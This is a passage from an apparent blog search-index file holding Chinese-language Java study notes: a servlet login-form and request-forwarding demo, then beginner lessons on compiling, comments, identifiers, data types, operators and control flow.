encoding=\"UTF-8\"?>\n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee\nhttp://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\"\n         metadata-complete=\"true\">\n    &lt;servlet>\n        &lt;servlet-name>req&lt;/servlet-name>\n        &lt;servlet-class>com.quan9i.servlet.request&lt;/servlet-class>\n    &lt;/servlet>\n    &lt;!--servlet的请求路径-->\n    &lt;servlet-mapping>\n        &lt;servlet-name>req&lt;/servlet-name>\n        &lt;url-pattern>/login&lt;/url-pattern>\n    &lt;/servlet-mapping>\n&lt;/web-app>\n\n这里的是空白的，那我们让他跳转到成功界面实现代码如下\n#success.jsp\n\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n&lt;html>\n&lt;head>\n    &lt;title>Title&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;h1>success!!!&lt;/h1>\n&lt;/body>\n&lt;/html>\n\n#web.xml同上\n#index.jsp同上\n#request.java\npublic class request extends HttpServlet &#123;\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        //处理方求\n        String username = req.getParameter(\"username\");\n        String password = req.getParameter(\"password\");\n\n        System.out.println(username + \":\" + password);\n\n        resp.sendRedirect(\"/r/success.jsp\");\n    &#125;\n&#125;\n\n此时输入值后的效果是这样的\nRequest应用获取前端参数的函数\n我们这里通过设计一个前端代码获取参数同时进行转发，具体实现代码如下所示\n#request.java\npublic class request extends HttpServlet &#123;\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        // 解决后端接收中文乱码问题\n        req.setCharacterEncoding(\"utf-8\");\n        resp.setCharacterEncoding(\"utf-8\");\n\n        String username = req.getParameter(\"username\");\n        String password = req.getParameter(\"password\");\n        String[] hobbies = req.getParameterValues(\"hobbies\");\n        System.out.println(\"username:\" + username + \",password:\" + password + \",hobbies:\" + Arrays.toString(hobbies));\n\n        // 通过请求转达\n        req.getRequestDispatcher(\"/success.jsp\").forward(req, resp);\n    &#125;\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;\n        doGet(req,resp);\n    &#125;\n&#125;\n#web.xml同上\n#success.jsp同上\n#index.jsp\n&lt;html>\n&lt;body>\n&lt;div style=\"text-align: center\">\n    &lt;%-- 这里表单提交的意思，以 post 方式提交表单，提交到我们的 login 请求--%>\n    &lt;form action=\"$&#123;pageContext.request.contextPath&#125;/login\" method=\"post\">\n        用户名：&lt;input type=\"text\" name=\"username\"> &lt;br>\n        密码：&lt;input type=\"password\" name=\"password\"> &lt;br>\n        爱好：&lt;input type=\"checkbox\" name=\"hobbies\" value=\"开心\">😀\n        &lt;input type=\"checkbox\" name=\"hobbies\" value=\"流泪\">😭\n        &lt;input type=\"checkbox\" name=\"hobbies\" value=\"研究\">🧐\n        &lt;input type=\"checkbox\" name=\"hobbies\" value=\"调皮\">😝\n        &lt;br>\n        &lt;input type=\"submit\" value=\"登录\">\n    &lt;/form>\n&lt;/div>\n&lt;/body>\n&lt;/html>\n启动tomcat登录后\n成功实现转发在idea中也看到了输出信息\n","slug":"JAVAWeb学习小记","date":"2022-11-13T16:54:30.000Z","categories_index":"JAVA","tags_index":"语言学习","author_index":"quan9i"},{"id":"a1b84c0190a37e192f2165ae5ca9a78a","title":"JAVA基础语法-学习笔记","content":"day01文件运行过程首先呢，我们创一个后缀名为java的文件，而后写入内容其次，我们以管理员身份打开cmd，通过javac运行来得到class文件最后，通过java命令来将刚刚生成的clss文件运行这就是整个过程，图示如下图所示注：首先写的那个java文件称作源文件，通过javac运行后的class文件称为字节码文件理论是很简单的，下面来以输出Hello World进行实操\n实践设置一个java文件，这里命名为HelloWold.java\n开始写入内容首先是需要一个类的，我们这个时候就去写类名\nclass quan9i&#123;\n&#125;\n这个时候类名写好了，是quan9i，但是运行的话是需要一个主函数的，我们这个时候写入主函数\nclass quan9i&#123;\n    public static void main(String[] args)&#123;\n        \n    &#125;\n\n&#125;\n注：java语言是严格区分大小写的，我们这里的String中的S是大写，需要注意。这个时候的话主函数也已经写好了，但是这个时候我们没有写内容，那么它是输出不了HelloWorld的，所以这个时候添上打印一个Helloworld的代码即可\nclass quan9i&#123;\n    public static void main(String[] args)&#123;\n            System.out.println(\"HelloWorld\");\n    &#125;\n\n&#125;\n此时源文件就写好了，我们以管理员身份运行cmd，切换到当前路径下，而后javac这个文件即可此时再去文件夹下看这个时候就生成了quan9i.class文件注：字节码文件是以类名命名的，我们的类名是quan9i，所以这里的字节码文件就是quan9i.class此时去java这个字节码文件即可注:在运行java这个指令时，不需要写后缀.class，直接写名字就可以运行这个文件\n一点小trickjava语言是严格区分大小写的，但是我们的windows是不区分大小写的，因此我们在将源文件进行编译的时候，其实大写还是小写都是可以成功编译的但仅仅只是这个编译过程，在运用java指令时它就又属于java层面了，此时就又区分了大小写\n注意事项我们这里的输出语句是这样的\nSystem.out.println(\"HelloWorld\");\n但其实它也可以这样写\nSystem.out.print(\"HelloWorld\");\n那么这两个有什么区别呢，区别就是前者是先输出数据，后换行，而后者是只输出数据，从拼写也可以看出来，前者多了ln它是line的缩写，我们接下来来测试一下还有一个小的注意事项就是当一个文件存在多个类时，javac运行后会出现多个字节码文件，这个时候我们去java那个含main方法的就可以了。\n注释java 语言中的注释有三种格式\n1、单行注释\n2、多行注释\n3、文档注释（java独有）\n他们的注释方法如下(xxx指的是内容)\n1、 //\n2、 /*\n\t*/\n3、\n\t/**\n\t*/\n前两个的作用是相同的，即\n对所写的程序进行解释说明，增强代码可读性\n可以调试代码(报错时将语句加注释进行排查)\n而文档注释的作用不单单是这个，它的注释内容可以被JDK提供的工具javadoc所解析，生成一套网页文件形式体现的该程序的说明文档\n实践创建一个java源文件\n上次写的是HelloWorld，那这次写个HelloJava好了\nclass HelloJava&#123;\n    public  static void main(String[] args)&#123;\n            System.out.println(\"HelloJava\");\n    &#125;\n&#125;\n此时内容就写好了，我们开始添加我们的注释\n/**\n文档注释\n@author quan9i\n@version 1.0\n这是我的第一个java程序\n*/\nclass HelloJava&#123;\n    /*\n    多行注释\n    如下的main方法是程序的入口！\n    main的格式是固定的\n    */\n    /**\n    文档注释\n    如下的方式是main() ,是程序的入口处\n    */\n    public  static void main(String[] args)&#123;\n            //单行注释：如下的语句表示输出到控制台\n            System.out.println(\"HelloJava\");\n    &#125;\n&#125;\n此时就完成了，既有单行和多行，又有文档，那么该怎么利用javadoc解析这个文档注释呢，指令如下\njavadoc -d 名字 -author -version 文件名\n这里的名字是我们自己起的，文件名的话就是我们之前创建的HelloJava.java但是此时去运行的时候，会发现报错说找不到公共或受保护的类，这是因为我们没有给类添加public，此时在内容中的class前添加public即可\n/**\n文档注释\n@author quan9i\n@version 1.0\n这是我的第一个java程序\n*/\npublic class HelloJava&#123;\n    /*\n    多行注释\n    如下的main方法是程序的入口！\n    main的格式是固定的\n    */\n    /**\n    文档注释\n    如下的方式是main() ,是程序的入口处\n    */\n    public  static void main(String[] args)&#123;\n            //单行注释：如下的语句表示输出到控制台\n            System.out.println(\"HelloJava\");\n    &#125;\n&#125;\n此时就完成了，去文件夹下查看，会发现多了一个名为quan9i的文件夹里面有很多个文件我们打开index.html查看这个时候就可以看到文档注释中的内容输出到了界面中，而单行和多行则不然\n注意事项文件至多一个public我们刚刚知道了运行javadoc的时候需要一个public，但这个public在一个文件中只能有一个，当出现文件中有多个类名的情况时，它只能添加到与文件名同名的类前面，例如我们上面的代码就是HelloJava类，我们的文件名也是如此，这个时候才可以成功运行\n多行注释不可嵌套多行注释是不可以嵌套使用的可以看到此时最后一个*/已经不是注释内容了，这是因为它在嵌套使用的时候，把第二个/*当成了文本内容，但遇见*/时就直接闭合，这个注释就已经完成了，而此时多出了*/，导致了这个不能成为注释，由此可知多行注释是不可以嵌套使用的\nJAVA APIAPI，全称为Application Programming Interface，中文名为应用程序编程接口JAVA语言提供了大量的基础类，因此ORacle也为这些基础类提供了相应的API文档，用于告诉开发者如何使用这些类，以及这些类里包含的方法API入口https://itmyhome.com/java-api/index.html?overview-summary.html打开它之后就可以看见这个结构，它其实就类似于一个字典，我们有不明白的类时，可以在这里面看它的具体含义它整体的结构如下\n实践我们之前写的代码String[] args中的String就是一个类，我们该如何搜索它呢，我们如果是网页端的话，没有这个搜索框，此时我们就可以借助ctrl+f寻找关键词，我们输入String而后回车即可点击这个String此时就可以看到该类的介绍\nday 02问题问题1JDK、JRE、JVM三者之间的关系，以及JDK、JRE包含的主要结构有哪些\n\n三者之间的关系是JDK包含JRE，JRE包含JVM，如下图所示\nJDK=JRE+开发工具(javac.exe、java.exe、javadoc.exe)JRE=JVM+Java核心类库总的来说如下图所示\n问题2为什么要配置path环境变量\n为了在cmd中，任何情况下都可调用java命令（即不论在哪个目录下都可以用java指令）\n问题3常用的命令行操作符\ncd //切换目录\nrd //删除目录\nmd //创建目录\ndir //列出目录\ndel //删除文件\n问题4创建如下的类，使得运行能够输出\n姓名:王大锤\n\n性别：男\n住址:花果山\n构造java源文件如下\nclass man&#123;\n    public static void main(String args[])&#123;\n        System.out.println(\"姓名:王大锤\");\n        System.out.println();\n        System.out.println(\"性别：男\");\n        System.out.print(\"住址:花果山\");\n\n    &#125;\n&#125;\n而后利用javac进行编译，再用java指令运行字节码文件即可\nJAVA语言特点1、面向对象性\n两个要素：类、对象\n三个特征：封装、继承、多态\n2、健壮性\n1、去除了C语言中的指针\n2、自动的垃圾回收机制\n3、跨平台性在windows、linux和macos上都可以运行，实现了\n一次编译，到处运行\n原因是因为有JVM\n关键字与保留字关键字\n\n\n\n\n\n\n\n\n\n定义：被JAVA语言赋予了特殊含义，用做专门用途的字符串特点：关键字中字母都为小写\n比如说之前用到的class和public这里的true、false和null是灰色的，这是因为它的位置比较特殊 ，它不完全属于关键词，这三个是定义值的，但是又是当作关键字来用，类似于公司的外包机制\n保留字\n\n\n\n\n\n\n\n\n\nJava 保留字列表 (依字母排序 共14组) :Java保留字是指现有Java版本尚未使用 但以后版本可能会作为关键字使用。byValue, cast, false, future, generic, inner, operator, outer, rest, true, var， goto ，const,null\n标识符\n\n\n\n\n\n\n\n\n定义：Java对各种变量、方法和类等要素命名时使用的字符序列称为标识符技巧：凡是可以自己起名字的地方都叫标识符比如：类名、方法名、变量名、接口名\n定义合法标识符规则1、由26个英文字母大小写、0-9、_或$组成\n2、数字不可以开头\n3、不可以使用关键字和保留字，但能包含关键字和保留字\n4、Java严格区分大小写，长度无限制\n5、标识符中不能包含空格\n实践我们新建一个quan9i.java文件，内容如下\nclass quan9i&#123;\n    public static void main(String args[])&#123;\n    &#125;\n&#125;\n此时去编译一下此时是可以正常编译的，而当我们这样写的时候\nclass 1quan9i&#123;\n    public static void main(String args[])&#123;\n\n    &#125;\n&#125;\n\n此时就报出了语法错误，这里报错是因为我们的第二个规则，不能以数字开头此时我们再测试一下第三个规则，内容如下\nclass void&#123;\n    public static void main(String args[])&#123;\n\n    &#125;\n&#125;\n此时因为调用了关键字，出现了多个错误，但是第三个规则中还说了可以包含关键字和保留字，这个怎么理解呢，示例如下\nclass void1&#123;\n    public static void main(String args[])&#123;\n\n    &#125;\n&#125;\nvoid1中包含了void关键字，但它不是关键字，因此这里用是没有问题的此时再测试第四个，代码如下\nclass Void&#123;\n    public static void main(String args[])&#123;\n    &#125;\n&#125;\n此时有关键字却可以，这是为什么呢，因为Java严格区分大小写，关键字规定都是小写的，这个里面的类名是Void，第一个字母是大写，与关键字不同，所以这里可以正常使用此时测试最后一个规则\nclass Void quan9i&#123;\n    public static void main(String args[])&#123;\n\n    &#125;\n&#125;\n此时就报出了一个错误，这个就是第五个规则，不能包含空格，一般标识符是只有一个字符串的，他这里会将前面的Void视为标识符，后面的无法正常识别，导致了报错\n标识符命名规范\n\n\n\n\n\n\n\n\n包名：多单词组成时所有字母都小写xxyyzz类名、接口名：多单词组成时，所有单词首字母大写XxYyZz变量名、方法名：多单词组成时，第一个单词首字母小写，其他首字母大写xxYyZz常量名：所有字母都大写，多单词时每单词间以下划线连接XX_YY_ZZ\nclass quan9i&#123;\n    public static void main(String args[])&#123;\n\n    &#125;\n&#125;\n这个其实是不规范的，因为类名首字母应该大写，我们尝试编译一下发现可以，这就是命名规则与命名规范的区别\n\n\n\n\n\n\n\n\n\n不按照命名规则来会报错，无法编译不按照命名规范来不会报错，可编译\n注：不按这个规范来的话，是可以正常编译的，但不易于区分，因此建议按照这个来进行命名\n变量\n\n\n\n\n\n\n\n\n概念：内存中的一个存储区域该区域的数据可以在同一类型范围内不断变化变量是程序中最基本的存储单元。包含变量类型（整型、字符型等）、变量名和存储的值\n变量的作用\n用于在内存中存储数据\n使用变量需要注意的地方\n1、Java中每个变量必须先声明，后使用\n2、使用变量名来访问这块区域的数据\n3、变量的作用域，其定义在所在的一对&#123;&#125;内\n4、变量只有在其作用域中才有效\n5、同一个作用域内，不能定义重名的变量\n\n实践/*\n变量的使用\n1、java定义变量的格式，数据类型 变量名 = 变量值；\n*/\nclass VariableTest&#123;\n    public static void main(String[] args)&#123;\n        int myAge = 18;\n        System.out.println(myAge);\n    &#125;\n&#125;\n\n\n当然，也可以这样写\n/*\n变量的使用\n1、java定义变量的格式，数据类型 变量名 = 变量值；\n*/\nclass VariableTest&#123;\n    public static void main(String[] args)&#123;\n        int\tmyAge;\n        myAge = 18;\n        System.out.println(myAge);\n    &#125;\n&#125;\n\n我们如果这样写呢\nclass VariableTest&#123;\n    public static void main(String[] args)&#123;\n        System.out.println(myAge);\n    &#125;\n    public void method()&#123;\n        int myAge = 1;\n    &#125;\n&#125;\n试着去编译一下报错，这个时候就是因为我们的变量作用域是在一对&#123;&#125;内那么这样可不可以呢\nclass VariableTest&#123;\n    public static void main(String[] args)&#123;\n        int myAge = 18;\n        System.out.println(myAge);\n        int myAge = 2;\n    &#125;\n&#125;\n报错，这是因为同一作用域内不可以定义同名的变量\n变量分类\n\n\n\n\n\n\n\n\n基本数据类型\n整型：byte 、short、int、long浮点型：float、double字符型：char布尔型：boolean\n\n\n\n\n\n\n\n\n\n引用数据类型\n类(class)接口(interface)数组(array)\n整型变量的使用\n\n\n\n\n\n\n\n\n整型变量有四种类型byteshortintlong\n\n测试class VariableTest&#123;\n    public static void main(String[] args)&#123;\n        byte a1=-127;\n        byte a2=18;\n        System.out.println(a1);\n        System.out.println(a2);\n    &#125;\n&#125;\n\n\nclass VariableTest&#123;\n    public static void main(String[] args)&#123;\n        byte a1=-127;\n        byte a2=18;\n        short s1=128;\n        int i1 = 1234;\n        long l1 = 321231231L;\n        System.out.println(i1);\n        System.out.println(l1);\n    &#125;\n&#125;\n仔细看的话这里的long l1赋值时最后有一个L，这个L是声明为long型的，输出时不会输出它\nday 03浮点型变量浮点型分为两类，float和double型，两者区别简单说就是float占四字节，double占八字节，它的精度是大于float型的，而且float的表示范围比整型中的long还要长\n\n实践\nclass VariableTest&#123;\n    public static void main(String[] args)&#123;\n        double d1 = 111.11;\n        float f1 = 22.22;\n        System.out.println(d1);\n        System.out.println(f1);\n    &#125;\n&#125;\n这个时候可以发现它报错了，这个是为什么呢，因为float型在结尾需要加上f或者F表示它是一个浮点型，所以我们修改代码如下\nclass VariableTest&#123;\n    public static void main(String[] args)&#123;\n        double d1 = 111.11;\n        float f1 = 22.22f;\n        System.out.println(d1);\n        System.out.println(f1);\n    &#125;\n&#125;\n通常，我们使用浮点型时用double型\n字符型char（一字符等于两字节）\n定义char型时，一般用单引号包裹\n\n\n\n\n\n\n\n\n\n\n表示方式1、声明一个字符 例 char a1=’c’;2、转义字符 例 char a1=’\\n’;3、Unicode字符集。例 char a1=’\\u0043’;\n实践\nclass VariableTest&#123;\n    public static void main(String[] args)&#123;\n        char c1 = 'a';\n        char c2 = '1';\n        char c3 = '\\u0043';//字符c\n        char c4 = '\\n';\n        System.out.println(c1);\n        System.out.println(c2);\n        System.out.println(c3);\n        System.out.print(\"Hello\" + c4);\n        System.out.println(\"World\");\n\n    &#125;\n&#125;\n\n\n布尔型变量布尔型boolean，只有两个值，一个是true，另一个是false布尔型常常用于循环结构、条件语句中使用。\n实践\nclass VariableTest&#123;\n    public static void main(String[] args)&#123;\n       boolean a1=true;\n       if(a1)&#123;\n        System.out.print(\"你不可以参加\\\"单身\\\"派对了!!!\\n很遗憾。\");\n       &#125;\n       else&#123;\n        System.out.print(\"你可以多参加几个\\\"单身\\\"派对来交个女朋友！！！\");\n       &#125;\n\n    &#125;\n&#125;\n\n\n数据类型转换转换原则\n（1）占用字节较少的数据类型转换成字节数较多的数据类型；\n\n（2）字符类型会转换成int类型；\n\n（3）int类型会转换成float类型；\n\n（4）若表达式中其中一个类型为double，另一个操作数也会转double；\n\n（5）布尔类型不能转换为其它类型；\n实践class VariableTest&#123;\npublic static void main(String[] args) &#123;\n\t\tint i = 10;\n        long a = 3;\n        float c =  i/a;\n        double d = c + a;\n        System.out.println(i);\n        System.out.println(a);\n        System.out.println(c);\n        System.out.println(d);\n\n    &#125; \n&#125;\n\nday 04强制类型转换一般默认的整型为int，浮点型为double\n实践如果长度长一点，用long来表示，此时会怎样呢\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n            long l = 123123;\n            System.out.println(l);\n            long l1 = 21332423235234123;\n            System.out.println(l1);\n    &#125; \n&#125;\n而当我们在long后面加上L\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n            long l = 123123;\n            System.out.println(l);\n            long l1 = 21332423235234123L;\n            System.out.println(l1);\n    &#125; \n&#125;\n现在来试一下类型转换\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n            byte b = 12;\n            byte b1 = b + 1;     \n            \n    &#125; \n&#125;\n这里是因为1是整型，默认就是int型，int-&gt;byte变小，这种转换不正常，所以报错，浮点型同理\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n            float b = 12;\n            float b1 = b + 12.2;     \n            \n    &#125; \n&#125;\n默认是double型，double-&gt;float不正常，所以报错但我们可以强制进行转换，如下\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n            int a = 1;\n            short b = (short)a;\n            System.out.println(b);\n    &#125; \n&#125;\n\n\nString类变量字符串型，一般用双引号来包裹\n实践class VariableTest&#123;\npublic static void main(String[] args) &#123;\n           String s1=\"Hello World\";\n           System.out.println(s1);   \n           String s2 = \"a\";\n           String s3 = \"\" ;\n           int number = 666;\n           String cj=\"成绩:\";\n           String grade= cj + number;\n           System.out.println(grade);        \n    &#125; \n&#125;\n这里的加号是连接符，为了区分连接符，我们可以多做几个示例来分辨一下\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n           char a = 'a';\n           int b = 10;\n           String c = \"Hello World\"; \n           System.out.println(a+b+c);  \n           System.out.println(a+(b+c));\n           System.out.println((a+b)+c);   \n    &#125; \n&#125;\n第一个：a与b运算，a是char型的，此时换成ascii码，也就是97，来与b运算，此时就是相加，变107，后面是连接符，所以是107Hello World第二个：b与c先运算，由于int型与String型是不可以相加的，所以这里为连接符，而后后面变为一个整体与前面进行连接，所以就是a10Hello World第三个：a和b先运算，与第一个类似，相加后为107，而后进行连接，结果为107 Hello World\n练习\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n           System.out.println('*'+'\\t'+'*');  \n           System.out.println('*'+\"\\t\"+'*');\n           System.out.println('*'+(\"\\t\"+'*'));   \n    &#125; \n&#125;\n\n\n第一个：\\t是单引号包裹的，被认为是char型，转换为ascii码与前者的ascii码进行相加，而后再加后者的ascii码，最后得到93。第二个：\\t是双引号包裹的，被认为是String型，它此时的含义就是制表符，前后的+此时就是连接符，输出结果就是*    *第三个：与第二个类似，无论括号在前在后结果都是相同的\n进制表示方式\n\n\n\n\n\n\n\n\n二进制(binary)：0,1，满2进1，以0b或0B开头十进制(decimal)：0-9，满10进1八进制(octal):0-7，满8进1，以数字0开头十六进制(hex)：0-9及A-F，满16进1，以0x或0X开头，此处的A-F不区分大小写\n实践class VariableTest&#123;\npublic static void main(String[] args) &#123;\n            int num1 = 0b110;\n            int num2 = 110;\n            int num3 = 0110;\n            int num4 = 0x110;\n            System.out.println(\"num1 = \"+num1);\n            System.out.println(\"num2 = \"+num2);\n            System.out.println(\"num3 = \"+num3);\n            System.out.println(\"num4 = \"+num4);\n    &#125; \n&#125;\n\n\nday 05算术运算符首先需要说明的就是这个取余运算，它的结果正负是取决于前者的，比如a%b，如果前者是正，结果就是正，前者是负，结果就是负，与后者的正负五关，详情可以看下面的实践算数运算符有以下几种\n实践class VariableTest&#123;\npublic static void main(String[] args) &#123;\n            int a1 = 13;\n            int a2= 2;\n            double b1 = 13/2;\n        System.out.println(a1%a2);\n        System.out.println(b1);\n        System.out.println(-13%2);\n        System.out.println(13%-2);\n        System.out.println(-13%-2);\n    &#125; \n&#125;\n\n\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n            int a1 = 10;\n            int b1 = a1++;//先取值后运算，等同于b1=a1;a1=a1+1;\n         System.out.println(a1);\n         System.out.println(b1); \n            int a2 = 10;  \n            int b2 = ++a2;//先运算后取值，等同于a2=a2+1;b2=a2;\n         System.out.println(a2);\n         System.out.println(b2); \n            int a3 = 10; \n            int b3 = a3--;\n        System.out.println(a3);//先取值后运算，等同于b3=a3;a3=a3-1##;\n        System.out.println(b3);\n            int a4 = 10; \n            int b4 = --a4;//先运算后赋值，等同于a4=a4-1;b4=a4;\n        System.out.println(a4);\n        System.out.println(b4);\n    &#125; \n&#125;\n\n问题写一个程序，分别输出187的个位，十位和百位。代码如下\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n            int a = 187;\n            int bai = a /100;\n            int shi = a %100 /10;\n            int ge = a %10;\n            System.out.println(\"百位:\"+bai);\n            System.out.println(\"十位:\"+shi);\n            System.out.println(\"个位:\"+ge);\n\n    &#125; \n&#125;\n\n比较运算符这里的注意点的话就是需要知道单个的=是赋值，==才是相等的意思。比较运算符有以下几种没啥意思，不举例子\n赋值运算符赋值运算符有以下几种\n+=\n-=\n%=\n/=\n*=\n举个简单的例子，a+=b就等同于a=a+b\n实践class VariableTest&#123;\npublic static void main(String[] args) &#123;\n        int num1 =10;\n        num1 +=2;\n        System.out.println(num1);\n        int num2 =6;\n        num2 %= 4;\n        System.out.println(num2);\n        int num3 = 3;\n        num3 *= 3;\n        System.out.println(num3);\n        \n\n    &#125; \n&#125;\n\n小测验class VariableTest&#123;\npublic static void main(String[] args) &#123;\n        int i = 1;\n        i *=0.1;\n        System.out.println(i);\n        i++;\n        System.out.println(i);\n\n    &#125; \n&#125;\n说出第一个和第二个i的值答案;第一个为0，第二个为1在计算机语言中，不论是1*0.1还是1*0.9，其结果都是0下一题\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n        short s = 3;\n       ① s = s + 2;\n       ② s+= s+2\n        System.out.println(s);\n    &#125; \n&#125;\n代码中①与②的区别是什么答案：①是无法编译的，因为+2的话2被视为int型，int型向byte转换，会出现转换错误②可以正常编译\nday 06逻辑运算符逻辑运算符有以下几种\n&amp;\n|\n!\n&amp;&amp;\n|| \n^ \n具体如下图\n实践class VariableTest&#123;\npublic static void main(String[] args) &#123;\n        boolean b1=false;\n        int a1=10;\n        if(b1 &amp; (a1++>0))&#123;\n            System.out.println(\"我现在在北京\");\n        &#125;\n        else&#123;\n            System.out.println(\"我现在在南京\");\n        &#125;\n        System.out.println(\"a1 = \"+a1);\n    \n        boolean b2=false;\n        int a2=10;\n        if(b2 &amp;&amp; (a2++>0))&#123;\n            System.out.println(\"我现在在北京\");\n        &#125;\n        else&#123;\n            System.out.println(\"我现在在南京\");\n        &#125;\n        System.out.println(\"a2 = \"+a2);\n&#125;\n&#125;\n从结果可以看出，当第一个是false时，&amp;还会往下继续运行，而&amp;&amp;则直接跳过第一个正确时，两个都会往后运行此时再看|和||\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n        boolean b1=true;\n        int a1=10;\n        if(b1 | (a1++>0))&#123;\n            System.out.println(\"我现在在北京\");\n        &#125;\n        else&#123;\n            System.out.println(\"我现在在南京\");\n        &#125;\n        System.out.println(\"a1 = \"+a1);\n    \n        boolean b2=true;\n        int a2=10;\n        if(b2 || (a2++>0))&#123;\n            System.out.println(\"我现在在北京\");\n        &#125;\n        else&#123;\n            System.out.println(\"我现在在南京\");\n        &#125;\n        System.out.println(\"a2 = \"+a2);\n&#125;\n&#125;\n当第一个正确时，|还会继续往后运行，而||则直接跳过第一个错误的话，两个都会往后运行\n位运算符简单说一下这个左移右移，用二进制数讲解\n12 8 4 2 1  结果\n 0 0 0 1 1 | 3\n左移二位\n 0 1 1 0 0 | 12\n右移一位\n 0 0 0 0 1 | 1\n这个与或亦是如此\n12 8 4 2 1  结果\n 0 0 1 1 0 | 6\n 0 0 0 1 1 | 3\n经过&amp;运算\n 0 0 0 1 0 | 2\n经过|运算\n 0 0 1 1 1 | 7\n经过^运算（相同取0，不同取1）\n 0 0 1 0 1 | 5\n取反运算的话就是符号位相反而后加1，6就变成-7结论\n位运算符操作的都是整型的数据\n&lt;&lt;:在一定范围内，每左移1位，相当于 *2\n>>:在一定范围内，每右移1位，相当于 /2\n\n实践class VariableTest&#123;\npublic static void main(String[] args) &#123;\n        int  i = 20;\n        System.out.println(\"i&lt;&lt;2=\"+(i&lt;&lt;2));\n        System.out.println(\"i>>2=\"+(i>>2));\n&#125;\n&#125;\n\n三元运算符a?b:c\n当a条件为true时，执行b，否则就执行c\n实践class VariableTest&#123;\npublic static void main(String[] args) &#123;\n       int a = 12;\n       int b = 30;\n       int c = -40;\n       int max1 = (a>b)?a:b;\n       int max2 = (max1>c)?max1:c;\n       System.out.println(\"三个数中的最大值为:\"+max2);\n&#125;\n&#125;\n\nday 07if - else流程控制两种格式，第一种\nif(条件1)&#123;\n\t\t\txxx\n&#125;\nelse&#123;\n\t\txxx\n&#125;\n当条件一为true时，就执行if语句里的内容，否则就执行else中的内容第二种(可以写多个else if 语句，但结尾需要是else)\nif(条件1)&#123;\n\t\t\txxx\n&#125;\nelse if(条件2)&#123;\n\t\t\txxx\n&#125;\nelse&#123;\n\t\txxx\n&#125;\n当条件1满足时，执行if里的语句，当条件1不满足，而条件二满足时，执行else if里的语句，否则执行else里的语句\n实践class VariableTest&#123;\npublic static void main(String[] args) &#123;\n       int a = 12;\n       int b = 30;\n       if(a>b)&#123;\n              System.out.println(\"最大值为:\" + a);\n       &#125;\n       else&#123;\n              System.out.println(\"最大值为:\" + b);\n       &#125;\n&#125;\n&#125;\n\n\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n       int a = 12;\n       int b = 30;\n       if(a>b)&#123;\n              System.out.println(\"最大值为:\" + a);\n       &#125;\n       else if(a&lt;b)&#123;\n              System.out.println(\"最大值为:\" + b);\n       &#125;\n       else&#123;\n              System.out.println(\"两者无法确定最大值\");\n       &#125;\n&#125;\n&#125;\n\n\nscanner如何从键盘获取不同类型的变量，需要使用Scanner类\n步骤\n1:导包：import java.util.Scanner;\n2:Scanner的实例化:Scanner scan = new Scanner(System.in);\n3:调用Scanner类的相关方法，来获取指定类型的变量。\n从官方文档就可以看见函数的使用方法，如输入int用nextInt部分方法如下图举个简单的例子\nimport java.util.Scanner;\n\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n       Scanner scan = new Scanner(System.in);\n       int num = scan.nextInt();\n       System.out.println(num);\n&#125;\n&#125;\n上面是输入，下面是输出\n实践/*\n如何从键盘获取不同类型的变量，需要使用Scanner类\n\n步骤\n1:导包：import java.util.Scanner;\n2:Scanner的实例化:Scanner scan = new Scanner(System.in);\n3:调用Scanner类的相关方法，来获取指定类型的变量。\n*/\nimport java.util.Scanner;\n\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n       Scanner scan = new Scanner(System.in);\n       System.out.println(\"请输入您的姓名\");\n       String name = scan.next();\n       System.out.println(name);\n\n       System.out.println(\"请输入您的年龄\");\n       int age = scan.nextInt();\n       System.out.println(age);\n\n       System.out.println(\"请输入您的体重\");\n       double weight = scan.nextDouble();\n       System.out.println(weight);\n\n       System.out.println(\"你是否对我有好感?(true/false)\");\n       boolean isgood= scan.nextBoolean();\n       System.out.println(isgood);\n\n       //对于char型的获取，Scanner没有提供相关方法，只能获取一个字符串\n       System.out.println(\"请输入您的性别(男/女)\");\n       String xingbie = scan.next();\n       char xb = xingbie.charAt(0);\n&#125;\n&#125;\n\n\nday 08switch - case格式如下\nswitch(表达式)&#123;\ncase 常量1:\n\t执行语句1；\n\t//break;(可写可不写，写的话就跳出去了，不写继续往后执行)\ncase 常量2\n\t执行语句2:\n\t//break;\n...\ndefault:(case中没有对应的常量时执行)\n\t执行语句n;\n\t//break;\n实践import java.util.Scanner;\n\nclass VariableTest&#123;\npublic static void main(String[] args) &#123;\n       Scanner scan = new Scanner(System.in);\n       System.out.println(\"请输入常量\");\n       int number = scan.nextInt();\n       switch(number)&#123;\n       case 0:\n              System.out.println(\"zero\");\n       \n       case 1:\n              System.out.println(\"one\");\n              break;\n       case 2:\n              System.out.println(\"two\");\n              break;\n       default:\n              System.out.println(\"other\");\n              break;\n       &#125;\n&#125;      \n&#125;\n\n\nfor循环原理与C相似\nfor(变量;条件;自增)&#123;\n\t\t循环体\n\t&#125;\n实践class VariableTest&#123;\npublic static void main(String[] args) &#123;\n       for(int i=0;i&lt;=3;i++)&#123;\n              System.out.println(\"quan9i\");\n       &#125;\n&#125;      \n&#125;\n\n\nwhile循环while(循环条件)&#123;\n\t\t循环体\n&#125;\n\n实践设计程序打印100以下的整数\n\nclass VariableTest&#123;\npublic static void 